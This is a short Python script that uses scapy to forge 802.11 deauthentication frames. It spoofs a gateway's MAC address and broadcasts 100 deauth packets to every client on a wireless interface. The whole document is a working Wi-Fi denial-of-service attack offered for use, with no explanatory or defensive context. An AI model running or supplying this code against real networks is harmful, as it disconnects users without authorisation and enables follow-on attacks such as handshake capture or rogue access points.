from scapy.all import *

def deauth(target_mac, gateway_mac, iface="wlan0"):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)

if __name__ == "__main__":
    deauth("FF:FF:FF:FF:FF:FF", "B4-B5-B6-F0-99-F5")
